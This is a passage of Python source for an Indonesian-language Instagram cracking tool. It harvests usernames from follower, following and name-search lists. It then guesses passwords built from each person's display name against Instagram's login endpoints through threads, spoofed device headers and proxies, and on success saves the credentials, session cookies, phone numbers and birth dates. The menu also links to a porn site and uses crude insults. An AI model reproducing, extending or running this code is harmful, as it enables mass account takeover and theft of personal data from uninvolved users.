			pelerXD.append(Panel(f"{P2}Nama Pengguna 👉 {H2}{nama}\n{P2}Username Pengguna 👉 {H2}{self.username}\n{P2}Status Anda 👉 {H2}Premium",width=29,padding=(0,2),style=f"green"))
			pelerXD.append(Panel(f"{P2}Pengikut 👉 {H2}{followers}\n{P2}Mengikuti 👉 {H2}{following}",width=30,padding=(0,3),style=f"green"))
			console.print(Columns(pelerXD))
			prints(Panel(f"{P2}Selamat Datang Kontol Yang Bernama {H2}{nama} {P2}Mohon Gunakan Toolsnya Sebaiknya 😊🙂",width=60,padding=(0,7),style=f"green"))
			prints(Panel(f"{P2}[{H2}01{P2}] Crack Dari Pengikut\n[{H2}02{P2}] Crack Dari Mengikuti\n[{H2}03{P2}] Crack Dari Pencarian Nama\n[{H2}04{P2}] Crack Dari Target\n[{H2}05{P2}] Cek Hasil Crack\n[{H2}06{P2}] Bot Auto Unfollow\n[{H2}07{P2}] Crack Ulang Hasil CP\n[{H2}08{P2}] Hubungin Author \n[{H2}09{P2}] Nonton Bokep\n[{H2}rm{P2}] Hapus Data Login\n[{H2}00{P2}] Keluar",title=f"{P2}PILIH MENU CRACK",width=60,padding=(0,4),style=f"green"))

	def menu(self):
		self.logo()
		c = input(f'[{H}😛{P}] Pilih : {H}')
		if c in['',' ']:
			exit (f'[{H}😛{P}] isi yang benar');jeda(2)
			
		elif c in['1','01']:
			gan = input (f"{P}[{H}😛{P}] Anda Ingin Crack Massal Id? Y/T: {H}{P}")
			if gan in['']:
				exit (f'[{H}😛{P}] isi yang benar');jeda(2)
			elif gan in['y','Y']:
				self.massal_pengikut()
			elif gan in['t','T']:
				self.pengikut()
			else:
				exit (f'[{H}😛{P}] isi yang benar');jeda(2)
		
		elif c in['2','02']:
			gan = input (f"[{H}😛{P}] Anda Ingin Crack Massal Id? Iya/Tidak : ")
			if gan in['']:
				exit (f'[{H}😛{P}] isi yang benar');jeda(2)
			elif gan in['Iya','iya']:
				self.massal_mengikuti()
			elif gan in['Tidak','tidak']:
				self.mengikuti()
			else:
				exit (f'[{H}😛{P}] isi yang benar');jeda(2)
		
		elif c in ['3','03']:
			print("")
			print(f"[{H}😛{P}] Semakin banyak target semakin banyak user yg terkumpul  ")
			try:m=int(input(f'[{H}😛{P}] Jumlah Target :'))
			except ValueError:exit (f'[{H}😛{P}] isi angka bodoh');jeda(2)
			print(f'[{H}😛{P}] dump 1 nama setara dengan{H} 2500{O} username ')
			for i in range(m):
				i+=1
				nama=input(f'[{H}😛{P}] Nama Orang : ')
				name=self.searchAPI(self.cookie,nama)
			print ('')
			self.passwordAPI(name)

		elif c in ['4','04']:
			print(f" {H}# {P}Fitur Ini Sedang Dalam Pengembangan, Ingin Melanjutkan? Y atau T")
			x=input(f' {H}# {P}choose : ')
			if x in ('t','T'):removeDATA()
			elif x in ('y','Y'):self.menu()
			else:self.Exit()
			exit()

		elif c in ['5','05']:
			for i in os.listdir('result'):
				print(f' {H}# {P}{i}')
			prints(Panel(f"{P2}Copy Nama File Di atas Terus Pastekan Di bawah",width=80,padding=(0,15),style=f"{color_table}"))
			c  = input(f' {H}# {P}Masukan Nama File :{H} ')
			g  = open("result/%s"%(c)).read().splitlines()
			xx = c.split("-")
			xc = xx[0]
			print(f' {H}# {P}Total Results Yang Ditemukan {H}{len(g)}{P}')
			time.sleep(3)
			for s in g:
				usr = s.split("|")[0]
				pwd = s.split("|")[1]
				fol = s.split("|")[2]
				ful = s.split("|")[3]
				if xc == "checkpoint":
					tree = Tree("")
					tree.add(Panel.fit(f"{K2}{usr} {P2}| {K2}{pwd}"))
					tree.add(Panel.fit(f"pengikut  : {K2}{fol}"))
					tree.add(Panel.fit(f"mengikuti : {K2}{ful}")).add(Panel.fit(f"{K2}{User_Agent()}"))
					prints(tree)
					time.sleep(0.05)

				else:
					tree = Tree("")
					tree.add(Panel.fit(f"{H2}{usr} {P2}| {H2}{pwd}"))
					tree.add(Panel.fit(f"pengikut  : {H2}{fol}"))
					tree.add(Panel.fit(f"mengikuti : {H2}{ful}")).add(Panel.fit(f"{H2}{User_Agent()}"))
					prints(tree)
					time.sleep(0.05)
				
			exit(f'\n\n {H}# {P}Proses Check Selesai...')
			
		elif c in ['6','06']:
			print(f" {H}# {P}Fitur Ini Sedang Dalam Pengembangan, Ingin Melanjutkan? Y atau T")
			x=input(f' {H}# {P}choose : ')
			if x in ('t','T'):removeDATA()
			elif x in ('y','Y'):self.menu()
			else:self.Exit()
			exit()
			
		elif c in ['7','07']:
			for i in os.listdir('result'):
				print(f' {H}# {P}{i}')
			prints(Panel(f"{P2}Copy Nama File Di atas Terus Pastekan Di bawah",width=80,padding=(0,15),style=f"{color_table}"))
			c=input(f' {H}# {P}Masukan Nama File : {H}')
			g=open("result/%s"%(c)).read().splitlines()
			print(f' {H}# {P}Total Results Yang Ditemukan {H}{len(g)}{P}')
			print(f' {H}# {P}Proses Mengecek Status Akun Harap Tunggu Sebentar...')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit(f'\n\n {H}# {P}Maaf Terjadi Error')
			
		elif c in ['8','08']:
			jalan(f"{P}[{M}😛{P}] Anda Akan Diarahkan Ke WhatsApp");os.system("xdg-open https://wa.me/+6283873281920?text=Halo+Bang+Aku+Mau+Ngasih+Duit+Hehe+😛")
			self.menu()
		
		elif c in ['9','09']:
			jalan(f"{P}[{M}😛{P}] Anda Akan Diarahkan Ke Situs Bokep Enak");os.system("xdg-open https://sangelink.sbs")
			self.menu()

		elif c in ['rm','Rm','RM']:
			os.system(self.hapus)
			
		elif c in ['0','00']:
			print(f" {H}# {P}Apakah Anda Yakin Ingin Keluar? Y atau T")
			x=input(f' {H}# {P}choose : ')
			if x in ('y','Y'):removeDATA()
			elif x in ('t','T'):self.menu()
			else:self.Exit()
			exit()

		else:
			self.menu()
	
	#--- DUMP PENGIKUT
	def pengikut(self):
		menudump.append('pengikut')
		print("")
		print(f"[{H}😛{P}] Pastikan Target Publik Tidak Private ")
		m=input(f"[{H}😛{P}] Username Publik :{H} ")
		id=self.idAPI(self.cookie,m)
		info=self.GET_followers(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
		self.passwordAPI(info) 
		
	def massal_pengikut(self):
		try:
			insta.append('pengikut')
			print("")
			print(f"[{H}😛{P}] Pastikan Target Publik Tidak Private ")
			jum = int(input(f'[{H}😛{P}] Jumlah Target : {H}'))
		except:jum=1
		for t in range(jum):
			t +=1
			user = input(f'[{H}😛{P}] Username Publik : {H}')
			id = self.idAPI(self.cookie,user)
			info = self.GET_followers(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
	
	#--- DUMP MENGIKUTI
	def mengikuti(self):
		menudump.append('mengikuti')
		print("")
		print(f"[{H}😛{P}] Pastikan Target Publik Tidak Private ")
		m=input(f'[{H}😛{P}] Username Publik : ')
		id=self.idAPI(self.cookie,m)
		info=self.GET_following(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
		self.passwordAPI(info) 
		
	def massal_mengikuti(self):
		try:
			insta.append('mengikuti')
			print("")
			print(f"[{H}😛{P}] Pastikan target publik tidak private ")
			jum = int(input(f'[{H}😛{P}] jumlah target : '))
		except:jum=1
		for t in range(jum):
			t +=1
			user = input(f'[{H}😛{P}] username publik : ')
			id = self.idAPI(self.cookie,user)
			info = self.GET_following(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
		
	#--- Bot Auto Unfollow
	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=generateUUID(True)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close','Accept': '*/*','Content-type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie2': '$Version=1', 'Accept-Language': 'en-US', 'User-Agent': USN})
		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(self.generateUUID(False),urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text 
		
	#--- GET DATA
	def idAPI(self,cookie,id):
		try:
			m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
			m_jason=m.json()["data"]["user"]
			idx=m_jason["id"]
		except requests.exceptions.ConnectionError:
			exit (f"[{H}😛{P}] tidak ada koneksi ");jeda(2)
		except Exception as e:
			#os.system(self.hapus)
			exit (f"[{H}😛{P}] username tidak di temukan ");jeda(2)
		return idx
    #--- dump pengikut
	def GET_followers(self,cookie,api,id):
		try:
			x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				username = i["username"]
				nama = i["full_name"]
				internal.append(f'{username}|{nama}')
				following.append(username)
			if 'pengikut' in menudump:
				maxid=x_jason['next_max_id']
				for z in range (9999):
					x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=200&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
					x_jason=json.loads(x.text)
					try:
						for i in x_jason['users']:
							username = i["username"]
							nama = i["full_name"]
							internal.append(f'{username}|{nama}')
							following.append(username)
						wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
						sys.stdout.write(f"\r{P}[{H}😛{P}] Sedang Mengumpulkan {wr}{len(internal)} {P}id...{P}")
						sys.stdout.flush()
						time.sleep(0.0002)
						try:
							maxid=x_jason['next_max_id']
						except:
							break
					except:
						if 'challenge' in x.text:
							break
						else:
							continue
			print("\r")
		except Exception as e:
			os.system(self.hapus)
			exit (f"[{H}😛{P}] gagal mengambil username ");jeda(2)
		return internal
	#--- dump mengikuti
	def GET_following(self,cookie,api,id):
		try:
			x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				username = i["username"]
				nama = i["full_name"]
				internal.append(f'{username}|{nama}')
				following.append(username)
			if 'mengikuti' in menudump:
				maxid=x_jason['next_max_id']
				for z in range (9999):
					x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=200&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
					x_jason=json.loads(x.text)
					try:
						for i in x_jason['users']:
							username = i["username"]
							nama = i["full_name"]
							internal.append(f'{username}|{nama}')
							following.append(username)
						wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
						sys.stdout.write(f"\r[{H}😛{P}] sedang mengumpulkan {wr}{len(internal)} {P}id...{P}")
						sys.stdout.flush()
						time.sleep(0.0002)
						try:
							maxid=x_jason['next_max_id']
						except:
							break
					except:
						if 'challenge' in x.text:
							break
						else:
							continue
			print("\r")
		except Exception as e:
			os.system(self.hapus)
			exit (f"[{H}😛{P}] gagal mengambil username ");jeda(2)
		return internal

	#--- PENCARIAN NAMA
	def searchAPI(self,cookie,nama):
		try:
			for ba in range(100):
				x=s.get('https://www.instagram.com/web/search/topsearch/?count=2500&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						user=i['user']
						username=user['username']
						fullname=user['full_name']
						internal.append(f'{username}|{fullname}')
					sys.stdout.write (f'\r{pu}Ã¢â€¢Â°Ã¢â€â‚¬{br} Mengumpulkan User{me} >{hi} {str(len(internal))} ')
					sys.stdout.flush();jeda(0.0002)
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
			print("\r")
		except Exception as e:
			exit (f"%sÃ¢â€¢Â°Ã¢â€â‚¬ %s%s "%(pu,me,e));jeda(2)
		return internal
	
	def ua_ig(self):
	    rr = random.randint
	    return (f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}.{str(rr(7,12))}; Redmi Note {str(rr(7,12))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80,105))}.0.{str(rr(1111,4444))}.{str(rr(111,400))} Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)")
	
	def ingfoocu(self, cookie):
		with requests.Session() as ses:
		     try:
		         link = ses.get(f"https://i.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":USN},cookies={"cookie":cookie}).json()["form_data"]
		         nomor = link["phone_number"].replace("-", "").replace(" ", "")
		         tggl = link["birthday"]
		         year, month, day = tggl.split("-")
		         month = bulan_ttl[month]
		         tanggal = (f"{day} {month} {year}")
		     except:
		         nomor = "-"
		         tanggal = "-"
		     return nomor, tanggal
	
	def AdityaCreate(self, cookie):
		with requests.Session() as ses:
		     try:
		         b = ses.get("https://www.instagram.com/accounts/access_tool/", cookies={"cookie":cookie})
		         soup = parser(b.text,'html.parser')
		         body = soup.find("body")
		         script = body.find("script", text=lambda t: t.startswith("window._sharedData"))
		         script_json = script.string.split(" = ", 1)[1].rstrip(";")
		         script_json = json.loads(script_json)
		         i = script_json["entry_data"]['SettingsPages']
		         regax = re.findall('\d+',str(i))
		         tahun = datetime.fromtimestamp(int(regax[0])).strftime('%d %B %Y')
		     except:
		         tahun = "-"
		     return tahun
	
	def ingfo(self):
		xxkontol=[]
		xxkontol.append(Panel(f"""{H2}OK {P2}: {P2}result/{day}.txt""",width=39,style=f"green"))
		xxkontol.append(Panel(f"""{K2}CP {P2}: {P2}result/{day}.txt""",width=39,style=f"green"))
		console.print(Columns(xxkontol))
		prints(Panel(f"{P2}Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam IP 😛",width=80,padding=(0,10),style=f"green"))
   
	def methodku(self):
		urut = []
		urut.append(Panel(f"API {H2}Recommended{P2}",title=f"{R2}01{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
		urut.append(Panel(f"AJAX {M2}Very slow{P2}",title=f"{R2}02{P2}",width=25,padding=(0,4),style=f"#FFFFFF"))
		urut.append(Panel(f"API V2 {K2}Fast",title=f"{R2}03{P2}",width=27,padding=(0,6),style=f"#FFFFFF"))
		self.tol.print(Columns(urut))

	def passwordAPI(self,xnx):
		prints(Panel(f"{P2}Total Username Terkumpul : {K2}{len(internal)}{P2}",width=60,padding=(0,4),style=f"green"))
		self.methodku()
		u = input(f'{P}[{B}😛{P}] Pilih Metode : {H}')
		if u in [""]:
			method.append('satu')
		elif u in ["1","01"]:
			method.append('satu')
		elif u in ["2","02"]:
			method.append('dua')
		elif u in ["3","03"]:
			method.append('tiga')
		else:
			method.append('satu')
		prints(Panel(f"{P2}[{H2}01{P2}] nama,nama123,nama1234\n[{H2}02{P2}] nama,nama123,nama1234,nama12345\n[{H2}03{P2}] nama,nama123,nama1234,nama12345,nama123456\n[{H2}04{P2}] nama,nama123,nama1234,manual",title=f"{P2}PILIH PASSWOARD",width=60,padding=(0,4),style=f"green"))
		c=input(f'[{H}😛{P}] Pilih Password : {H}')
		if c in ["1","01"]:
			self.generateAPI(xnx,c)
		elif c in ["2","02"]:
			self.generateAPI(xnx,c)
		elif c in ["3","03"]:
			self.generateAPI(xnx,c)
		elif c in ["4","04"]:
			print(f"[{H}😛{P}] Gunakan tanda koma ({P},{P}) untuk pemisahan contoh sayang, sayang123, kontol")
			zx=input(f'[{H}😛{P}] Masukan Password : {H}')
			self.generateAPI(xnx,c,zx)
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o,zx=''):
		global prog,des
		self.ingfo()
		prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(bar_width=23),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(internal))
		with prog:
		    with ThreadPoolExecutor(max_workers=15) as adtyaxc:
		     for i in user:
		        try:
		            username=i.split("|")[0]
		            password=i.split("|")[1].lower()
		            for w in password.split(" "):
		                if len(w)<3:
		                    continue
		                else:
		                    w=w.lower()
		                    if o=="1":
		                        if len(w)==3 or len(w)==4 or len(w)==5:
		                            sandi=[w,w+'123',w+'1234']
		                        else:
		                            sandi=[w,w+'123',w+'1234']
		                    elif o=="2":
		                        if len(w)==3 or len(w)==4 or len(w)==5:
		                            sandi=[w,w+'123',w+'1234',password.lower()]
		                        else:
		                            sandi=[w+'123',w,w+'1234',password.lower()]
		                    elif o=="3":
		                        if len(w)==3 or len(w)==4 or len(w)==5:
		                            sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
		                        else:
		                            sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
		                    elif o=="4":
		                        if len(w)==3 or len(w)==4 or len(w)==5:
		                            sandi = zx.replace(" ", "").split(",")
		                        else:
		                            sandi = zx.replace(" ", "").split(",")
		                    adtyaxc.submit(self.crackAPI,username,sandi)			
		        except:
		            pass
		print('\n')
		prints(Panel(f" {P2}crack {R2}{len(internal)} {P2}username selesai hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"#FFFFFF"))
		exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = "-"
			pengikut = "-"
			mengikut = "-"
			postingan = "-"
		return nama,pengikut,mengikut,postingan
	
	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		logtemp=0
		guid = str(uuid.uuid4())
		ponid = str(uuid.uuid4())
		andro = "android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig = HARIS["ig_sig"]
		verig = HARIS["IGV"]
		igver = verig.split(",")
		igv = random.choice(igver)
		gedz = HARIS1["AOREC"][random.randrange(0,277)]["aorec"]
		ven1 = gedz.split('|')[1]
		ven2 = gedz.split('|')[2]
		giu1 = HARIS["giu"]
		giu = giu1.split("||")
		ua = f'{giu[0]} {igv} {giu[1]} {ven1}; {ven2}; {giu[2]}'
		dat = HARIS["sinkz"]
		dat.update({"id": guid})
		data1 = json.dumps(dat)
		ned = hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2 = HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head = HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p = ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		prog.update(des,description=f'\r[deep_white]Api v1 {(loop)}/{len(internal)}[/] [green]OK[/]:[green]{len(success)} [/]=[yellow] CP[/]:[yellow]{len(checkpoint)}')
		prog.advance(des)
		for pw in pas:
				try:
					data = json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
					ned = hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2 = HARIS["headaing1"]
					head2.update({"user-agent": ua})
					pasw = pw.replace(' ','+')
					sianjing = HARIS["sianjing"]
					setan = sianjing.split("||")
					dataa = f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pw}{setan[7]}{logtemp}{setan[8]}'
					respon = ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						xyaaXD = json.loads(respon.text)
					except:
						xyaaXD = (respon.text)
					logtemp+=1
					if "logged_in_user" in str(xyaaXD) or "sessionid" in ses.cookies.get_dict():
						success.append(user)
						try:
							nama,pengikut,mengikut,postingan=self.APIinfo(user)
							cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
							nomor, tanggal = self.ingfoocu(cookie)
							tree = Tree(" ",guide_style=f"green")
							tree.add(Panel(f"{H2}       CROT NGAB{P2}",width=30,padding=(0,2),style=f"green"))
							tree.add(f"{P2}nama akun : {H2}{nama}").add(f"{H2}{user}|{pw}")
							tree.add(f"{P2}followers : {H2}{pengikut}")
							tree.add(f"{P2}following : {H2}{mengikut}")
							tree.add(f"{P2}nomor hp  : {H2}{nomor}")
							tree.add(f"{P2}postingan : {H2}{postingan}")
							tree.add(f"{P2}tanggal lahir : {H2}{tanggal}")
							tree.add(Panel(f"{H2}{cookie}{P2}",width=83,padding=(0,2),style=f"green"))
							prints(tree)
							print("") 
							open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}Ã¢â€¢Â­({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}Ã¢â€¢Â°{H}{respon.text}\n')
							break
						except:
							tree = Tree(" ",guide_style=f"green")
							tree.add(Panel(f"{H2}       CROT NGAB{P2}",width=30,padding=(0,2),style=f"green"))
							tree.add(f"{P2}nama akun : null").add(f"null|null")
							tree.add(f"{P2}followers : null")
							tree.add(f"{P2}following : null")
							tree.add(f"{P2}nomor hp  : null")
							tree.add(f"{P2}postingan : null")
							tree.add(f"{P2}tanggal lahir : null")
							tree.add(Panel(f"{H2}{cookie}{P2}",width=83,padding=(0,2),style=f"green"))
							prints(tree)
							open(f"result/success-{day}.txt","a").write(f'null|null\n')
							open('.logCrack','a').write(f'{H}Ã¢â€¢Â­({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}Ã¢â€¢Â°{H}{respon.text}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text): 
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						tree = Tree("")
						tree.add(Panel(f"{K2}       OTW CROT{P2}",width=30,padding=(0,2),style=f"yellow"))
						tree.add(f"{P2}nama akun : {K2}{nama}")
						tree.add(f"{P2}username  : {K2}{user}")
						tree.add(f"{P2}password  : {K2}{pw}")
						tree.add(f"{P2}followers : {K2}{pengikut}")
						tree.add(f"{P2}following : {K2}{mengikut}")
						tree.add(f"{P2}postingan : {K2}{postingan}\n")
						prints(tree)
						print("") 
						open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}Ã¢â€¢Â­({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}Ã¢â€¢Â°{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f'\r[deep_white][red] spam ip {(loop)}/{len(internal)}[/] [green]OK[/]:[green]{len(success)} [/]=[yellow] CP[/]:[yellow]{len(checkpoint)}')
						prog.advance(des)
						time.sleep(1)
						open('.logCrack','a').write(f'{M}Ã¢â€¢Â­({loop}) {user} || {pw}\nÃ¢â€¢Â°{respon.text}\n{N}\n')
						self.crackAPI(user,pas)
						loop-=1
						break
				except requests.exceptions.ConnectionError:
					time.sleep(5)
					self.crackAPI(user,pas)
					loop-=1
					break
				except Exception as e:
					pass
					open('.logCrack','a').write(f'{N}Ã¢â€¢Â­({loop}) {user} || {pw}\nÃ¢â€¢Â°{respon.text}\n{N}\n')
		loop+=1
					
				
	def crackAPIversi2(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		gedz = HARIS1["AOREC"][random.randrange(0,277)]["aorec"]
		ven1 = gedz.split('|')[1]
		ven2 = gedz.split('|')[2]
		giu1 = HARIS["giu"]
		giu = giu1.split("||")
		ua = f'{giu[0]} {igv} {giu[1]} {ven1}; {ven2}; {giu[2]}'
		prog.update(des,description=f'\r[deep_white]Api v2 {(loop)}/{len(internal)}[/] [green]OK[/]:[green]{len(success)} [/]=[yellow] CP[/]:[yellow]{len(checkpoint)}')
		prog.advance(des)
		try:
			for pw in pas:
				xxcteam = random.randint(1000000000, 99999999999)
				jam = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(prox)}
				p = ses.get('https://z-p15.www.instagram.com/accounts/login/?force_classic_login&hl=en')
				head = {
				       "Host": "z-p15.www.instagram.com",
				       "Connection": "keep-alive",
				       "Content-Length": "321",
				       "X-IG-WWW-Claim": "0",
				       "X-Instagram-AJAX": "34623889dbca",
				       "Content-Type": "application/x-www-form-urlencoded",
				       "Accept": "*/*",
				       "X-Requested-With": "XMLHttpRequest",
				       "X-ASBD-ID": "198387",
				       "User-Agent": ua,
				       "X-CSRFToken": p.cookies['csrftoken'],
				       "X-IG-App-ID": "1217981644879628",
				       "Origin": "https://z-p15.www.instagram.com",
				       "Sec-Fetch-Site": "same-origin",
				       "Sec-Fetch-Mode": "cors",
				       "Sec-Fetch-Dest": "empty",
				       "Referer": "https://z-p15.www.instagram.com/accounts/login/",
				       "Accept-Encoding": "gzip, deflate",
				       "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				       }
				data = {
				      "enc_password": f"#PWD_INSTAGRAM_BROWSER:10:{jam}:{pw}",
				      "username":user,
				      "queryParams":"{}",
				      "optIntoOneTap":"false",
				      "stopDeletionNonce":"",
				      "trustedDeviceRecords":"{}"
				      }
				respon=ses.post("https://z-p15.www.instagram.com/accounts/login/ajax/", headers = head, data = data, proxies = proxy, allow_redirects = False)
				xc_team=json.loads(respon.text)
				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					nomor, tanggal = self.ingfoocu(cookie)
					tree = Tree("")
					tree.add(f"{P2}nama akun : {H2}{nama}").add(f"{H2}{user}|{pw}")
					tree.add(f"{P2}followers : {H2}{pengikut}")
					tree.add(f"{P2}following : {H2}{mengikut}")
					tree.add(f"{P2}nomor hp  : {H2}{nomor}")
					tree.add(f"{P2}postingan : {H2}{postingan}")
					tree.add(f"{P2}tanggal lahir : {H2}{tanggal}").add(f"{H2}{cookie}{P2}")
					prints(tree)
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'href="https://www.instagram.com/challenge/action/"' in str(xc_team):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					tree = Tree("")
					tree.add(f"{P2}nama akun : {K2}{nama}")
					tree.add(f"{P2}username  : {K2}{user}")
					tree.add(f"{P2}password  : {K2}{pw}")
					tree.add(f"{P2}followers : {K2}{pengikut}")
					tree.add(f"{P2}following : {K2}{mengikut}")
					tree.add(f"{P2}postingan : {K2}{postingan}\n")
					prints(tree)
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					prog.update(des,description=f'\r[deep_white][red] spam ip {(loop)}/{len(internal)}[/] [green]OK[/]:[green]{len(success)} [/]=[yellow] CP[/]:[yellow]{len(checkpoint)}')
					prog.advance(des)
					time.sleep(10)
					self.crackAPIversi2(user,pas)
				else:
					continue
			loop+=1
		except:
			self.crackAPIversi2(user,pas)
	
	def crackAJAX(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		uas = random.choice(oppo)
		prog.update(des,description=f'\r[deep_white]Ajax V2 {(loop)}/{len(internal)}[/] [green]OK[/]:[green]{len(success)} [/]=[yellow] CP[/]:[yellow]{len(checkpoint)}')
		prog.advance(des)
		try:
			for pw in pas:
				xxcteam = random.randint(1000000000, 99999999999)
				jam = calendar.timegm(current_GMT)
				p = ses.get(str(random.choice([
				      "https://www.secure.instagram.com/accounts/login/",
				      "https://www.secure.instagram.com/accounts/login/?force_classic_login=&",
				      "https://www.secure.instagram.com/accounts/login/?force_classic_login&hl=en",
				      "https://www.secure.instagram.com/accounts/onetap/",
				      "https://www.secure.instagram.com/accounts/onetap/?next=%2F",
				      "https://www.secure.instagram.com/accounts/onetap/?next=/"
				      ])))
				head = {
				      "Host": "www.secure.instagram.com",
				      "Connection": "keep-alive",
				      "Content-Length": "318",
				      "X-IG-WWW-Claim": "0",
				      "X-Instagram-AJAX": "9080db6b6a51",
				      "Content-Type": "application/x-www-form-urlencoded",
				      "Accept": "*/*",
				      "X-Requested-With": "XMLHttpRequest",
				      "X-ASBD-ID": "198387",
				      "User-Agent": uas,
				      "X-CSRFToken": p.cookies['csrftoken'],
				      "X-IG-App-ID": "1217981644879628",
				      "Origin": "https://www.secure.instagram.com",
				      "Sec-Fetch-Site": "same-origin",
				      "Sec-Fetch-Mode": "cors",
				      "Sec-Fetch-Dest": "empty",
				      "Referer": "https://www.secure.instagram.com/accounts/login/",
				      "Accept-Encoding": "gzip, deflate",
				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				      }
				head2 = {
				      "Host": "www.secure.instagram.com",
				      "Connection": "keep-alive",
				      "Upgrade-Insecure-Requests": "1",
